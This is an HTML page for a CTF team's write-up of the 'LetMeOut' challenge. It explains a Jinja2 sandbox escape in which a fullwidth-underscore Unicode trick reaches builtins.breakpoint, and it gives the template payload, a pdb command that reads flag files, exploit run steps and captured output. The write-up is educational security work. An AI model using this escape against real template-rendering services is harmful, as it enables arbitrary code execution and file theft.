@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>LetMeOut · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The jail allows one template of at most 170 ASCII characters with three distinct letters. The sandbox checks the raw attribute name but fetches the NFKC-normalised one, so a filter-made Tag string smuggles blocked attributes past the guard." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>letmeout</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>LetMeOut <span class="page-sub">Jinja2 sandbox escape via NFKC</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__&gt;_&lt;___77331508e2}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p><strong>Category:</strong> web · <strong>Files:</strong> <code>letmeout.zip</code> (source in <code>ext/</code>) · <strong>Flag format:</strong> <code>hiCTF{}</code>
+<strong>LIVE INSTANCE</strong> required for the real flag: <code>ncat --ssl &lt;host&gt; 1337</code>.</p>
+<h2 id="the-jail-extjailpy-abridged"><a class="wu-anchor" href="#the-jail-extjailpy-abridged" aria-hidden="true">#</a>The jail (<code>ext/jail.py</code>, abridged)</h2>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tag</span>(<span class="hljs-title class_ inherited__">str</span>):</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">    __slots__ = ()</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>): <span class="hljs-keyword">return</span> unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-variable language_">self</span>)</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rich</span>(<span class="hljs-params">v</span>):  <span class="hljs-keyword">return</span> Tag(v)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"><span class="hljs-keyword">def</span> <span class="hljs-title function_">plain</span>(<span class="hljs-params">v</span>): <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(Tag(v))</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">filters = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(random.sample(NAMES, <span class="hljs-number">2</span>), (rich, plain)))     <span class="hljs-comment"># NAMES = buff..tuff</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">    layout = <span class="hljs-built_in">input</span>()</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">    <span class="hljs-keyword">if</span> layout.isascii() <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(layout) &lt;= <span class="hljs-number">170</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>({c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> layout <span class="hljs-keyword">if</span> c.isalpha()}) &lt;= <span class="hljs-number">3</span>:</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">        env = SandboxedEnvironment(); env.<span class="hljs-built_in">globals</span>.clear(); env.filters.clear()</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">        env.filters.update(filters)</span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">        <span class="hljs-built_in">print</span>(env.from_string(layout).render())</span></span></code></pre>
+      
+    </figure><p>So: one <code>{{ expression }}</code>, ≤170 chars, ≤3 <strong>distinct</strong> letters, only two filters (<code>rich</code>/<code>plain</code>),
+no globals, sandboxed attribute access.</p>
+<h2 id="vulnerability-1-nfkc-smuggles-the-attribute-name-past-the-guard"><a class="wu-anchor" href="#vulnerability-1-nfkc-smuggles-the-attribute-name-past-the-guard" aria-hidden="true">#</a>Vulnerability 1 - NFKC smuggles the attribute name past the guard</h2>
+<p><code>jinja2.sandbox.SandboxedEnvironment.getitem</code> (3.1.6):</p>
+<figure class="wu-code" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">try</span>: <span class="hljs-keyword">return</span> obj[argument]                 <span class="hljs-comment"># (A) NO safety check</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">except</span> (TypeError, LookupError):</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(argument, <span class="hljs-built_in">str</span>):</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">        attr = <span class="hljs-built_in">str</span>(argument)              <span class="hljs-comment"># (B) Tag.__str__ -&gt; NFKC(argument)</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">        value = <span class="hljs-built_in">getattr</span>(obj, attr)        <span class="hljs-comment"># (C) attribute fetched with the NORMALISED name</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.is_safe_attribute(obj, argument, value):   <span class="hljs-comment"># (D) guard sees the RAW argument</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">            <span class="hljs-keyword">return</span> value</span></span></code></pre>
+      
+    </figure><p><code>is_safe_attribute</code> rejects <code>attr.startswith(&quot;_&quot;)</code>. But <code>attr</code> here is <code>str(argument)</code>, i.e. the
+<strong>NFKC-normalised</strong> string, while the guard is applied to the <strong>raw</strong> <code>argument</code>. A <code>Tag</code> whose raw
+text starts with <strong>U+FF3F FULLWIDTH LOW LINE</strong> (<code>\uff3f</code>, NFKC -&gt; <code>_</code>) therefore renders as
+<code>__class__</code> for <code>getattr</code> while passing <code>startswith(&quot;_&quot;)</code> and <code>is_internal_attribute</code>.</p>
+<h2 id="vulnerability-2-wrap-str-format-hands-out-an-unsandboxed-function"><a class="wu-anchor" href="#vulnerability-2-wrap-str-format-hands-out-an-unsandboxed-function" aria-hidden="true">#</a>Vulnerability 2 - <code>wrap_str_format</code> hands out an unsandboxed function</h2>
+<p><code>getitem</code> returns <code>self.wrap_str_format(value)</code> <strong>before</strong> the safety check. For any <code>str</code>/<code>str</code>
+subclass, <code>[&quot;format&quot;]</code> (a <em>non-underscore</em> name, so the guard would allow it anyway) returns a
+freshly-built Python <strong>wrapper function defined inside <code>jinja2/sandbox.py</code></strong>. Its <code>__globals__</code> is the
+<code>jinja2.sandbox</code> module namespace → <code>[&quot;__builtins__&quot;]</code> → <code>[&quot;breakpoint&quot;]</code> → <strong>pdb</strong>, whose stdin is the
+raw socket: from there every restriction (length / letters / sandbox) is gone.</p>
+<h2 id="payload-168-chars-for-all-ten-possible-filter-names"><a class="wu-anchor" href="#payload-168-chars-for-all-ten-possible-filter-names" aria-hidden="true">#</a>Payload (≤168 chars for <strong>all ten</strong> possible filter names)</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">{{(0|&lt;F&gt;)[&lt;&quot;format&quot;&gt;][(&quot;&lt;lit __globals__&gt;&quot;|&lt;F&gt;)][&lt;&quot;__builtins__&quot;&gt;][&lt;&quot;breakpoint&quot;&gt;]()}}</code></pre>
+      
+    </figure><ul>
+<li>every attribute/string letter is written as a 3-digit <strong>octal escape</strong> (<code>\137\143…</code>), which the jinja
+lexer decodes with <code>.encode(&quot;ascii&quot;,&quot;backslashreplace&quot;).decode(&quot;unicode-escape&quot;)</code> - octal contains
+only digits, so it contributes <strong>zero</strong> alphabetic characters;</li>
+<li>the only literal letters are those of the chosen <code>rich</code> filter name (all are <code>?uff</code> ⇒ {x,u,f} = 3
+distinct letters);</li>
+<li><code>lit __globals__</code> is <code>&quot;\uff3f_\147l\157\142\141l\163__&quot;</code> (leading U+FF3F + octal).</li>
+</ul>
+<p>Inside pdb (no <code>/bin/sh</code> in the image, so read files directly):</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> os,sys; sys.stdout.write(<span class="hljs-string">&#x27;&lt;&lt;&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flags/&#x27;</span>+f).read() <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(<span class="hljs-string">&#x27;/flags&#x27;</span>))+<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>); sys.stdout.flush()</span></span></code></pre>
+      
+    </figure><p>The real flag is the <code>hiCTF{...}</code> line; the other three names are decoys
+(&quot;not the flag you&#39;re looking for&quot;).</p>
+<h2 id="reproduce"><a class="wu-anchor" href="#reproduce" aria-hidden="true">#</a>Reproduce</h2>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-comment"># offline (Docker image built from ext/, verified locally):</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-built_in">cd</span> LetMeOut &amp;&amp; docker build -t letmeout-local ext/ &amp;&amp; python3 exploit.py <span class="hljs-built_in">local</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># live:</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">python3 exploit.py remote &lt;host&gt; 1337</span></span></code></pre>
+      
+    </figure><p><code>exploit.py</code> probes all ten filter names (<code>{{0|name}}</code> prints <code>0</code> iff the name exists), tries each
+present name (only the <code>rich</code> one yields a <code>Tag</code>, so only it enters pdb), drives pdb, and prints the
+<code>/flags/*</code> contents.</p>
+<h2 id="verified"><a class="wu-anchor" href="#verified" aria-hidden="true">#</a>Verified</h2>
+<p><code>python3 exploit.py remote letmeout-10ca6df92e4f.chall.hiddeninvestigations.net 1337</code> →</p>
+<figure class="wu-code wu-code-output" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">[*] filters present: ['luff', 'tuff']
+[*] trying rich filter luff (payload 159 chars)
+[+] inside pdb
+RESULT: not the flag you're looking for
+        not the flag you're looking for
+        not the flag you're looking for
+        hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__&gt;_&lt;___77331508e2}</code></pre>
+      
+    </figure><p><strong>FLAG: <code>hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__&gt;_&lt;___77331508e2}</code></strong>  (the flag name itself names
+the bug: &quot;normalize before you trust&quot; - <code>getitem</code> normalised for <code>getattr</code> but guarded the raw value).</p>
+<p>Offline (<code>python3 exploit.py local</code>) returns the image&#39;s placeholder
+<code>hiCTF{fake_flag_for_local_testing}</code> + 3 decoys, which proves the read path independent of the real flag.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#the-jail-extjailpy-abridged">The jail (ext/jail.py, abridged)</a></li><li><a href="#vulnerability-1-nfkc-smuggles-the-attribute-name-past-the-guard">Vulnerability 1 - NFKC smuggles the attribute name past the guard</a></li><li><a href="#vulnerability-2-wrap-str-format-hands-out-an-unsandboxed-function">Vulnerability 2 - wrap_str_format hands out an unsandboxed function</a></li><li><a href="#payload-168-chars-for-all-ten-possible-filter-names">Payload (≤168 chars for all ten possible filter names)</a></li><li><a href="#reproduce">Reproduce</a></li><li><a href="#verified">Verified</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="project-mangoo.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Project Mangoo</span></a>
+    <a class="wu-pager-link wu-pager-next" href="apex-engine.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Apex Engine</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
